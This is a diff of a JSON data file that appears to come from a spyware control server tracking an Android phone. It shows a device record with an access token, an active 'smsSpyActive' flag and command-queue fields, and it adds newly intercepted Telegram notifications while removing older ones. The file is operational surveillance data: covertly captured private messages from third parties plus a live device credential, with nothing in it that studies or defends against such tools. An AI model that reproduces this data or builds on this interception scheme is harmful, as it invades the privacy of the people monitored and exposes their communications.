@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632572101,
+    "lastSeen": 1775632573185,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Bank pakai 08",
+        "time": "08/04 14:16",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632575027
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "12 new messages from 11 chats",
+        "time": "08/04 14:16",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632574901
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:16",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632572757
+      },
+      {
+        "appName": "Telegram",
+        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
+        "content": "enggaa",
+        "time": "08/04 14:16",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632572749
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Sama aja bloon",
+        "time": "08/04 14:16",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632572736
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4286,46 +4326,6 @@
         "time": "08/04 13:44",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775630697855
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Sending video...",
-        "time": "08/04 13:44",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630697824
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Sending video...",
-        "time": "08/04 13:44",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630697350
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Sending video...",
-        "time": "08/04 13:44",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630697347
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Sending video...",
-        "time": "08/04 13:44",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630696791
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Sending video...",
-        "time": "08/04 13:44",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775630696599
       }
     ],
     "galleryPhotos": [],
